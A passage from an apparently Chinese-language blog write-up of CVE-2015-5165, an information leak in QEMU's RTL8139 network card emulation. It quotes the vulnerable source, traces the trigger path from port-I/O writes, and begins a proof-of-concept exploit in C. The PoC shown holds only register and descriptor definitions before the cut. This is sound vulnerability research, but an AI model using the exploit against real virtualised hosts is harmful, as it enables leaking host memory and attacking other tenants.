class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>rtl8139_transfer_frame</code>。可以看到如果有<code>TxLoopBack</code>标志的话，会调用<code>rtl8139_do_receive</code>发送给自己。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_transfer_frame</span><span class="params">(RTL8139State *s, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> do_interrupt, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *dot1q_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// .......</span></span><br><span class="line">    <span class="keyword">if</span> (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> buf2_size;</span><br><span class="line">        <span class="keyword">uint8_t</span> *buf2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            buf2_size = iov_size(iov, <span class="number">3</span>);</span><br><span class="line">            buf2 = g_malloc(buf2_size);</span><br><span class="line">            iov_to_buf(iov, <span class="number">3</span>, <span class="number">0</span>, buf2, buf2_size);</span><br><span class="line">            buf = buf2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">&quot;+++ transmit loopback mode\n&quot;</span>);</span><br><span class="line">        rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, size, do_interrupt);</span><br><span class="line">        <span class="comment">// .......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞代码触发"><a href="#漏洞代码触发" class="headerlink" title="漏洞代码触发"></a>漏洞代码触发</h3><p>在该设备源码文件下方可以找到设备的<code>TypeInfo</code>和<code>rtl8139_class_init</code>结构体，后者中可以看到引用了<code>pci_rtl8139_realize</code>函数，其中初始化了PMIO和MMIO。通过查看PMIO和MMIO处理函数的调用链，可以发现最终都是调用了以下几个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">rtl8139_io_readb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">rtl8139_io_readw</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">rtl8139_io_readl</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writeb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writew</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writel</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span>;</span><br></pre></td></tr></table></figure><p>在<code>rtl8139_io_writeb</code>中，<code>if (val &amp; (1 &lt;&lt; 6))</code>满足，则会调用<code>rtl8139_cplus_transmit</code>，而其中会调用漏洞函数<code>rtl8139_cplus_transmit_one</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rtl8139_cplus_transmit_one</span></span><br><span class="line"><span class="keyword">if</span> (!rtl8139_transmitter_enabled(s))  <span class="comment">// CmdTxEnb</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">&quot;+++ C+ mode: transmitter disabled\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!rtl8139_cp_transmitter_enabled(s))  <span class="comment">// CPlusTxEnb</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">&quot;+++ C+ mode: C+ transmitter disabled\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!(txdw0 &amp; CP_TX_OWN))  <span class="comment">// CP_TX_OWN</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">&quot;C+ Tx mode : descriptor %d is owned by host\n&quot;</span>, descriptor);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (txdw0 &amp; CP_TX_FS)  <span class="comment">// CP_TX_FS</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">&quot;+++ C+ Tx mode : descriptor %d is first segment &quot;</span></span><br><span class="line">            <span class="string">&quot;descriptor\n&quot;</span>, descriptor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reset internal buffer offset */</span></span><br><span class="line">    s-&gt;cplus_txbuffer_offset = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (txdw0 &amp; (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (proto == ETH_P_IP);</span><br><span class="line">    <span class="keyword">if</span> (txdw0 &amp; CP_TX_IPCS);</span><br><span class="line">    <span class="keyword">if</span> ((txdw0 &amp; CP_TX_LGSEN) &amp;&amp; ip_protocol == IP_PROTO_TCP);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链：</p><p><code>rtl8139_io_writeb</code>-&gt;<code>rtl8139_cplus_transmit</code>-&gt;<code>rtl8139_cplus_transmit_one</code>-&gt;<code>rtl8139_transfer_frame</code>-&gt;<code>rtl8139_do_receive</code>。</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>因为没使用kvm，使用的Tiny Code Generator模式执行虚拟机，调试过程中总是接收到SIGUSR1信号，然后中断。在gdbscript中添加以下命令可解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle SIGUSR1 nostop noprint</span><br></pre></td></tr></table></figure><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p><a href="https://github.com/clxsh/CVE/blob/main/CVE-2015-5165/poc.c">poc.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PRESENT (1ULL &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_PFN ((1ULL &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 PMIO base address</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMIO_BASE 0xC000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + MTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">/* w0 end of ring flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">/* first segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_FS (1&lt;&lt;29)</span></span><br><span class="line"><span class="comment">/* last segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">/* large send packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">/* large send MSS mask, bits 16...25 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">/* UDP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_UDPCS (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* TCP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 bits 0...15 : buffer size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE (1&lt;&lt;16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)</span></span><br><span class="line"><span class="comment">/* w1 add tag flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TAGC (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* w1 bits 0...15 : VLAN tag (big endian) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)</span></span><br><span class="line"><span class="comment">/* w2 low  32bit of Rx buffer ptr */</span></span><br><span class="line"><span class="comment">/* w3 high 32bit of Rx buffer ptr */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set after transmission */</span></span><br><span class="line"><span class="comment">/* FIFO underrun flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_UNF (1&lt;&lt;25)</span></span><br><span class="line"><span class="comment">/* transmit error summary flag, valid if set any of three below */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_TES (1&lt;&lt;23)</span></span><br><span class="line"><span class="comment">/* out-of-window collision flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_OWC (1&lt;&lt;22)</span></span><br><span class="line"><span class="comment">/* link failure flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_LNKF (1&lt;&lt;21)</span></span><br><span class="line"><span class="comment">/* excessive collisions flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_EXC (1&lt;&lt;20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Symbolic offsets to registers. */</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers &#123;</span><br><span class="line">    MAC0 = <span class="number">0</span>,        <span class="comment">/* Ethernet hardware address. */</span></span><br><span class="line">    MAR0 = <span class="number">8</span>,        <span class="comment">/* Multicast filter. */</span></span><br><span class="line">    TxStatus0 = <span class="number">0x10</span>,<span class="comment">/* Transmit status (Four 32bit registers). C mode only */</span></span><br><span class="line">                     <span class="comment">/* Dump Tally Conter control register(64bit). C+ mode only */</span></span><br><span class="line">    TxAddr0 = <span class="number">0x20</span>,  <span class="comment">/* Tx descriptors (also four 32bit). */</span></span><br><span class="line">    RxBuf = <span class="number">0x30</span>,</span><br><span class="line">    ChipCmd = <span class="number">0x37</span>,</span><br><span class="line">    RxBufPtr = <span class="number">0x38</span>,</span><br><span class="line">    RxBufAddr = <span class="number">0x3A</span>,</span><br><span class="line">    IntrMask = <span class="number">0x3C</span>,</span><br><span class="line">    IntrStatus = <span class="number">0x3E</span>,</span><br><span class="line">    TxConfig = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig = <span class="number">0x44</span>,</span><br><span class="line">    Timer = <span class="number">0x48</span>,        <span class="comment">/* A general-purpose counter. */</span></span><br><span class="line">    RxMissed = <span class="number">0x4C</span>,    <span class="comment">/* 24 bits valid, write clears. */</span></span><br><span class="line">    Cfg9346 = <span class="number">0x50</span>,</span><br><span class="line">    Config0 = <span class="number">0x51</span>,</span><br><span class="line">    Config1 = <span class="number">0x52</span>,</span><br><span class="line">    FlashReg = <span class="number">0x54</span>,</span><br><span class="line">    MediaStatus = <span class="number">0x58</span>,</span><br><span class="line">    Config3 = <span class="number">0x59</span>,</span><br><span class="line">    Config4 = <span class="number">0x5A</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    HltClk = <span class="number">0x5B</span>,</span><br><span class="line">    MultiIntr = <span class="number">0x5C</span>,</span><br><span class="line">    PCIRevisionID = <span class="number">0x5E</span>,</span><br><span class="line">    TxSummary = <span class="number">0x60</span>, <span class="comment">/* TSAD register. Transmit Status of All Descriptors*/</span></span><br><span class="line">    BasicModeCtrl = <span class="number">0x62</span>,</span><br><span class="line">    BasicModeStatus = <span class="number">0x64</span>,</span><br><span class="line">    NWayAdvert = <span class="number">0x66</span>,</span><br><span class="line">    NWayLPAR = <span class="number">0x68</span>,</span><br><span class="line">    NWayExpansion = <span class="number">0x6A</span>,</span><br><span class="line">    <span class="comment">/* Undocumented registers, but required for proper operation. */</span></span><br><span class="line">    FIFOTMS = <span class="number">0x70</span>,        <span class="comment">/* FIFO Control and test. */</span></span><br><span class="line">    CSCR = <span class="number">0x74</span>,        <span class="comment">/* Chip Status and Configuration Register. */</span></span><br><span class="line">    PARA78 = <span class="number">0x78</span>,</span><br><span class="line">    PARA7c = <span class="number">0x7c</span>,        <span class="comment">/* Magic transceiver parameter register. */</span></span><br><span class="line">    Config5 = <span class="number">0xD8</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    TxPoll        = <span class="number">0xD9</span>,    <span class="comment">/* Tell chip to check Tx descriptors for work */</span></span><br><span class="line">    RxMaxSize    = <span class="number">0xDA</span>, <span class="comment">/* Max size of an Rx packet (8169 only) */</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>, <span class="comment">/* C+ Command register (C+ mode only) */</span></span><br><span class="line">    IntrMitigate    = <span class="number">0xE2</span>,    <span class="comment">/* rx/tx interrupt mitigation control */</span></span><br><span class="line">    RxRingAddrLO    = <span class="number">0xE4</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    RxRingAddrHI    = <span class="number">0xE8</span>, <span class="comment">/* 64-bit start addr of Rx ring */</span></span><br><span class="line">    TxThresh    = <span class="number">0xEC</span>, <span class="comment">/* Early Tx threshold */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits in TxConfig. */</span></span><br><span class="line"><span class="keyword">enum</span> tx_config_bits &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Interframe Gap Time. Only TxIFG96 doesn&#x27;t violate IEEE 802.3 */</span></span><br><span class="line">        TxIFGShift = <span class="number">24</span>,</span><br><span class="line">        TxIFG84 = (<span class="number">0</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 8.4us / 840ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG88 = (<span class="number">1</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 8.8us / 880ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG92 = (<span class="number">2</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 9.2us / 920ns (10 / 100Mbps) */</span></span><br><span class="line">        TxIFG96 = (<span class="number">3</span> &lt;&lt; TxIFGShift),    <span class="comment">/* 9.6us / 960ns (10 / 100Mbps) */</span></span><br><span class="line"></span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">/* enable loopback test mode */</span></span><br><span class="line">    TxCRC = (<span class="number">1</span> &lt;&lt; <span class="number">16</span>),    <span class="comment">/* DISABLE appending CRC to end of Tx packets */</span></span><br><span class="line">    TxClearAbt = (<span class="number">1</span> &lt;&lt; <span class="number">0</span>),    <span class="comment">/* Clear abort (WO) */</span></span><br><span class="line">    TxDMAShift = <span class="number">8</span>,        <span class="comment">/* DMA burst value (0-7) is shifted this many bits */</span></span><br><span class="line">    TxRetryShift = <span class="number">4</span>,    <span class="comment">/* TXRR value (0-15) is shifted this many bits */</span></span><br><span class="line"></span><br><span class="line">    TxVersionMask = <span class="number">0x7C800000</span>, <span class="comment">/* mask out version bits 30-26, 23 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits in RxConfig. */</span></span><br><span class="line"><span class="keyword">enum</span> rx_mode_bits &#123;</span><br><span class="line">    AcceptErr = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> ChipCmdBits &#123;</span><br><span class="line">    CmdReset = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* C+ mode */</span></span><br><span class="line"><span class="keyword">enum</span> CplusCmdBits &#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// big 